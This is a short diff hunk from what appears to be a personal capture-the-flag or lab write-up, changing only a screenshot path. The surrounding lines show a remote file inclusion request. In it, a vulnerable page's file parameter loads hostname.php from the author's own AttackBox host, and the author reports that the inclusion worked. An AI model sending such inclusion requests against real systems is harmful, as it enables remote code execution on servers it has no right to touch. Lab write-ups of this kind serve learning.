@@ -37,7 +37,7 @@ http://10.10.55.248/playground.php?file=http://10.10.224.87:8000/hostname.php
 
 (where `.55.248` is the attacked machine and `.224.87` is my AttackBox instance).
 
-![[assets/Screenshot 2023-01-04 at 21.18.30.png]]
+![[public/Screenshot 2023-01-04 at 21.18.30.png]]
 
 Good. The string was included.
 
